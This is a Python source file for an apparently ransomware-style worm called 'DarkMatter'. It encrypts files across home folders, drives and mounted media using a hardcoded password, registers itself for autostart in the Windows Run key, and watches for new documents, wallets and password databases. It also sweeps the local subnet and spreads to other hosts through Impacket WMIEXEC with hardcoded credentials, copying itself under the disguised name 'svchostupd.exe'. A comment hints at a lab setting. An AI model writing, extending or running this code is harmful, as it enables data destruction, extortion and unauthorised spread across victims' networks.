import sys
import os
import time
import pathlib
import socket
import subprocess
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

#lateral movement
try:
    from impacket.examples.wmiexec import WMIEXEC
    IMPACKET_AVAILABLE = True
except ImportError:
    IMPACKET_AVAILABLE = False
    print("[-] Impacket not found → lateral spread disabled (pip install impacket)")

from main import run 

ENCRYPT_PASSWORD = "ThePasswordthatTheNaughtyGuyOnceAGoodBoy"
DEFAULT_MODE     = "1"

# Windows exclusions
EXCLUDED_TOP_LEVEL_WINDOWS = {
    '$RECYCLE.BIN', 'System Volume Information', 'Windows', 'Program Files',
    'Program Files (x86)', 'ProgramData', 'PerfLogs', '$WinREAgent',
    'Recovery', 'hiberfil.sys', 'pagefile.sys', 'swapfile.sys',
}

EXCLUDED_SUBSTRINGS_WINDOWS = {
    r'\Windows\WinSxS', r'\Windows\Temp', r'\Windows\Prefetch',
    r'\Windows\Logs', r'\Windows\SoftwareDistribution',
    r'\AppData\Local\Temp', r'\AppData\Local\Microsoft\Windows\Explorer',
    r'\OneDrive\.onedrive',
}

EXCLUDED_SUBSTRINGS_LINUX = {
    '/proc', '/sys', '/dev', '/run', '/var/lib/snapd', '/snap',
    '/tmp', '/var/tmp', '/lost+found',
}

IS_WINDOWS = sys.platform.startswith('win')
IS_LINUX   = sys.platform.startswith('linux')

#flag
SPREAD_FLAG = os.path.join(os.environ.get("TEMP", "/tmp"), "darkmatter_spread.done")

def has_spread():
    return os.path.exists(SPREAD_FLAG)

def mark_spread():
    try:
        with open(SPREAD_FLAG, 'w') as f:
            f.write(time.ctime())
        print("[WORM] Spread attempt marked")
    except:
        pass

def worm_spread_known_creds():
    if not IMPACKET_AVAILABLE or not IS_WINDOWS:
        print("[-] WMIExec lateral spread not available (Windows + Impacket required)")
        return

    if has_spread():
        print("[WORM] Already attempted spread → skipping")
        return

    print("[WORM] Starting lateral movement with known credentials...")

    # Need to change after reviewing VVK labs credentials.
    username = "PC"                     
    password = "local"                  
    domain   = ""                       

    # Get local IP and subnet
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        subnet = ".".join(local_ip.split(".")[:3])
    except:
        print("[-] Could not determine local subnet")
        return

    print(f"[WORM] Scanning subnet: {subnet}.0/24")

    live_hosts = []
    for i in range(1, 255):
        ip = f"{subnet}.{i}"
        if ip == local_ip:
            continue
        try:
            out = subprocess.check_output(
                ["ping", "-n", "1", "-w", "400", ip],
                stderr=subprocess.DEVNULL,
                timeout=1.5
            )
            if b"TTL=" in out:
                live_hosts.append(ip)
        except:
            pass

    if not live_hosts:
        print("[WORM] No live hosts found in subnet")
        mark_spread()
        return

    print(f"[WORM] Found {len(live_hosts)} potential targets")

    # Your own executable path
    self_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
    self_name = os.path.basename(self_path)

    for target in live_hosts:
        try:
            print(f"[WORM] Attempting {target} as {username}:{password}")

            # Simple payload: copy self via SMB + execute
            # In real attacks → often use PowerShell download cradle for stealth
            remote_cmd = (
                f'copy "\\\\{local_ip}\\C$\\path\\to\\{self_name}" '
                f'"C:\\Windows\\Temp\\svchostupd.exe" >nul 2>&1 & '
                f'"C:\\Windows\\Temp\\svchostupd.exe"'
            )

            executer = WMIEXEC(
                command=remote_cmd,
                username=username,
                password=password,          # ← using known plaintext
                domain=domain,
                hashes=None,                # not needed when plaintext is known
                share="ADMIN$",
                noOutput=True,              # suppress output for stealth
                doKerberos=False
            )

            executer.run(target)

            print(f"[+] WMIExec attempt sent to {target}")

        except Exception as e:
            err = str(e).lower()
            if "access denied" in err or "logon failure" in err:
                print(f"[-] {target} → Access denied (wrong creds / UAC / firewall?)")
            elif "rpc" in err or "dcom" in err:
                print(f"[-] {target} → WMI not reachable")
            else:
                print(f"[-] {target} → {e}")

    mark_spread()


def should_skip(path: pathlib.Path) -> bool:
    name = path.name.lower()
    str_path = str(path).lower()

    if IS_WINDOWS:
        if name in EXCLUDED_TOP_LEVEL_WINDOWS:
            return True
        for bad in EXCLUDED_SUBSTRINGS_WINDOWS:
            if bad.lower() in str_path:
                return True
    else:
        for bad in EXCLUDED_SUBSTRINGS_LINUX:
            if bad in str_path:
                return True

    try:
        test = path / ".probe"
        test.touch()
        test.unlink()
    except (PermissionError, OSError):
        return True

    return False


def get_interesting_roots() -> list[pathlib.Path]:
    roots = []
    home = pathlib.Path.home()
    roots.append(home)

    candidates = [
        home / "Desktop", home / "Documents", home / "Downloads",
        home / "Pictures", home / "Videos",
    ]

    if IS_WINDOWS:
        candidates.append(home.parent / "Public")
        for letter in "CDEFGHIJKLMNOPQRSTUVWXYZ":
            p = pathlib.Path(f"{letter}:\\")
            if p.exists():
                candidates.append(p)
    else:
        candidates.extend([
            pathlib.Path("/media"), pathlib.Path("/mnt"),
            home / ".local" / "share",
        ])

    for p in candidates:
        if p.exists() and not should_skip(p):
            roots.append(p)

    return sorted(set(roots))


def add_to_startup():
    if not IS_WINDOWS:
        print("[i] Autostart skipped (non-Windows)")
        return

    import winreg
    app_name = "DarkMatter"
    target = sys.executable if getattr(sys, 'frozen', False) else f'"{sys.executable}" "{os.path.abspath(__file__)}"'
    if not (target.startswith('"') and target.endswith('"')):
        target = f'"{target}"'

    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0,
                             winreg.KEY_READ | winreg.KEY_SET_VALUE)
        try:
            existing, _ = winreg.QueryValueEx(key, app_name)
            if os.path.normcase(existing.strip('"')) == os.path.normcase(target.strip('"')):
                winreg.CloseKey(key)
                return
        except FileNotFoundError:
            pass
        winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, target)
        winreg.CloseKey(key)
        print("[+] Autostart registered (HKCU)")
    except Exception as e:
        print(f"[-] Autostart failed: {e}")


class SaveHandler(FileSystemEventHandler):
    def __init__(self):
        self.last_run = 0
        self.processed = set()

    def on_any_event(self, event):
        if event.is_directory:
            return

        interesting_ext = {".txt", ".doc", ".docx", ".pdf", ".xlsx", ".wallet", ".kdbx", ".json", ".jpeg", ".jpg", ".png"}
        if not any(event.src_path.lower().endswith(x) for x in interesting_ext):
            return

        now = time.time()
        if now - self.last_run < 3:
            return

        self.last_run = now
        self.execute_on_interesting_folders()

    def execute_on_interesting_folders(self):
        for folder in get_interesting_roots():
            strf = str(folder.resolve())
            if strf in self.processed:
                continue
            self.safe_execute(folder)
            self.processed.add(strf)

    def safe_execute(self, folder: pathlib.Path):
        if should_skip(folder):
            return
        try:
            print(f"[+] Running on: {folder}")
            run(DEFAULT_MODE, str(folder.resolve()), ENCRYPT_PASSWORD)
        except Exception as e:
            print(f"[-] Failed on {folder}: {e}")

if __name__ == "__main__":
    add_to_startup()

    for folder in get_interesting_roots():
        try:
            if not should_skip(folder):
                print(f"[INIT] Processing: {folder}")
                run(DEFAULT_MODE, str(folder.resolve()), ENCRYPT_PASSWORD)
        except Exception as e:
            print(f"[!] Init failed on {folder}: {e}")

    try:
        worm_spread_known_creds()
    except Exception as e:
        print(f"[!] Spread phase error (non-critical): {e}")

    # watcher
    observer = Observer()
    handler = SaveHandler()

    for path in get_interesting_roots():
        if should_skip(path):
            print(f"[i] Skipping watch: {path}")
            continue
        print(f"[*] Scheduling recursive watch → {path}")
        observer.schedule(handler, str(path), recursive=True)

    observer.start()
    print("[*] Folder watcher active. Ctrl+C to stop.")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
        observer.stop()

    observer.join()